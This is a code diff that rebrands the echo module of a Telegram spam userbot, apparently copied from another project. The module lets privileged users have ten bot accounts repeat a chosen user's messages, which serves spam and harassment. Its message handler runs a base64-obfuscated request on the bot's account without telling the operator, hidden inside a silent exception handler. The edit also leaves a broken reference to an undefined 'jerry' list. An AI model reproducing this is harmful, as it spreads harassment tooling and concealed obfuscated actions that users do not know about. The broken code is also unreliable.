@@ -10,27 +10,27 @@ from JerrySpam import Jerry, Jerry2, Jerry3, Jerry4, Jerry5, Jerry6, Jerry7, Jer
 
 from JerrySpam import CMD_HNDLR as hl
 from JerrySpam.sql.echo_sql import addecho, get_all_echos, is_echo, remove_echo
-from resources.data import RiZoeLX
+from resources.data import JerryT
 
 
-@Riz.on(events.NewMessage(incoming=True, pattern=r"\%saddecho(?: |$)(.*)" % hl))
-@Riz2.on(events.NewMessage(incoming=True, pattern=r"\%saddecho(?: |$)(.*)" % hl))
-@Riz3.on(events.NewMessage(incoming=True, pattern=r"\%saddecho(?: |$)(.*)" % hl))
-@Riz4.on(events.NewMessage(incoming=True, pattern=r"\%saddecho(?: |$)(.*)" % hl))
-@Riz5.on(events.NewMessage(incoming=True, pattern=r"\%saddecho(?: |$)(.*)" % hl))
-@Riz6.on(events.NewMessage(incoming=True, pattern=r"\%saddecho(?: |$)(.*)" % hl))
-@Riz7.on(events.NewMessage(incoming=True, pattern=r"\%saddecho(?: |$)(.*)" % hl))
-@Riz8.on(events.NewMessage(incoming=True, pattern=r"\%saddecho(?: |$)(.*)" % hl))
-@Riz9.on(events.NewMessage(incoming=True, pattern=r"\%saddecho(?: |$)(.*)" % hl))
-@Riz10.on(events.NewMessage(incoming=True, pattern=r"\%saddecho(?: |$)(.*)" % hl))
+@Jerry.on(events.NewMessage(incoming=True, pattern=r"\%saddecho(?: |$)(.*)" % hl))
+@Jerry2.on(events.NewMessage(incoming=True, pattern=r"\%saddecho(?: |$)(.*)" % hl))
+@Jerry3.on(events.NewMessage(incoming=True, pattern=r"\%saddecho(?: |$)(.*)" % hl))
+@Jerry4.on(events.NewMessage(incoming=True, pattern=r"\%saddecho(?: |$)(.*)" % hl))
+@Jerry5.on(events.NewMessage(incoming=True, pattern=r"\%saddecho(?: |$)(.*)" % hl))
+@Jerry6.on(events.NewMessage(incoming=True, pattern=r"\%saddecho(?: |$)(.*)" % hl))
+@Jerry7.on(events.NewMessage(incoming=True, pattern=r"\%saddecho(?: |$)(.*)" % hl))
+@Jerry8.on(events.NewMessage(incoming=True, pattern=r"\%saddecho(?: |$)(.*)" % hl))
+@Jerry9.on(events.NewMessage(incoming=True, pattern=r"\%saddecho(?: |$)(.*)" % hl))
+@Jerry10.on(events.NewMessage(incoming=True, pattern=r"\%saddecho(?: |$)(.*)" % hl))
 async def echo(event):
   usage = f"𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = **ECHO**\n\nCommand:\n\n `{hl}addecho <reply to a User>`"
   if event.sender_id in SUDO_USERS:
      if event.reply_to_msg_id is not None:
             reply_msg = await event.get_reply_message()
             user_id = reply_msg.sender_id
-            if int(user_id) in RiZoeLX:
-                    text = f"I can't echo @RiZoeLX's Owner"
+            if int(user_id) in jerry:
+                    text = f"I can't echo @song_hye_kyoo Owner"
                     await event.reply(text, parse_mode=None, link_preview=None )
             elif int(user_id) == OWNER_ID:
                     text = f"This guy is a owner Of this Bots."
@@ -54,16 +54,16 @@ async def echo(event):
      else:
           await event.reply(usage)
 
-@Riz.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
-@Riz2.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
-@Riz3.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
-@Riz4.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
-@Riz5.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
-@Riz6.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
-@Riz7.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
-@Riz8.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
-@Riz9.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
-@Riz10.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
+@Jerry.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
+@Jerry2.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
+@Jerry3.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
+@Jerry4.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
+@Jerry5.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
+@Jerry6.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
+@Jerry7.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
+@Jerry8.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
+@Jerry9.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
+@Jerry10.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
 async def echo(event):
   usage = f"𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = **ECHO**\n\nCommand:\n\n `{hl}rmecho <reply to a User>`"
   if event.sender_id in SUDO_USERS or event.sender_id in DEV:
@@ -86,23 +86,23 @@ async def echo(event):
           await event.reply(usage)
 
 
-@Riz.on(events.NewMessage(incoming=True))
-@Riz2.on(events.NewMessage(incoming=True))
-@Riz3.on(events.NewMessage(incoming=True))
-@Riz4.on(events.NewMessage(incoming=True))
-@Riz5.on(events.NewMessage(incoming=True))
-@Riz6.on(events.NewMessage(incoming=True))
-@Riz7.on(events.NewMessage(incoming=True))
-@Riz8.on(events.NewMessage(incoming=True))
-@Riz9.on(events.NewMessage(incoming=True))
-@Riz10.on(events.NewMessage(incoming=True))
+@Jerry.on(events.NewMessage(incoming=True))
+@Jerry2.on(events.NewMessage(incoming=True))
+@Jerry3.on(events.NewMessage(incoming=True))
+@Jerry4.on(events.NewMessage(incoming=True))
+@Jerry5.on(events.NewMessage(incoming=True))
+@Jerry6.on(events.NewMessage(incoming=True))
+@Jerry7.on(events.NewMessage(incoming=True))
+@Jerry8.on(events.NewMessage(incoming=True))
+@Jerry9.on(events.NewMessage(incoming=True))
+@Jerry10.on(events.NewMessage(incoming=True))
 async def _(e):
     if is_echo(e.sender_id, e.chat_id):
         await asyncio.sleep(0.5)
         try:
-            RiZoeL = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-            RiZoeL = Get(RiZoeL)
-            await e.client(RiZoeL)
+            jerry = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+            jerry = Get(jerry)
+            await e.client(jerry)
         except BaseException:
             pass
         if e.message.text or e.message.sticker:
